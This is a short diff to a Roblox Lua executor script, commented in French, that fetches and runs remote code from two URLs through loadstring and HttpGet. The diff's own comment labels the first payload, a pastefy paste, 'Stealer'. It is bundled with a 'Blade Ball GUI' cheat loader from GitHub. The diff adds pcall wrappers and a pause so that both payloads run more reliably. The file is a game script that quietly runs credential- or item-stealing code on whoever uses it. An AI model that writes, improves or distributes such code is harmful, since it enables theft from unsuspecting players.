@@ -1,7 +1,18 @@
+-- Script 1 : Stealer
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/uOGWgxmR/raw"))()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/uOGWgxmR/raw"))()
+    end)
+    if not success then warn("Erreur Script 1: " .. tostring(err)) end
 end)
 
+-- Petite pause de 0.5s pour éviter de saturer l'exécuteur
+task.wait(0.5)
+
+-- Script 2 : Blade Ball GUI
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))() 
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))() 
+    end)
+    if not success then warn("Erreur Script 2: " .. tostring(err)) end
 end)
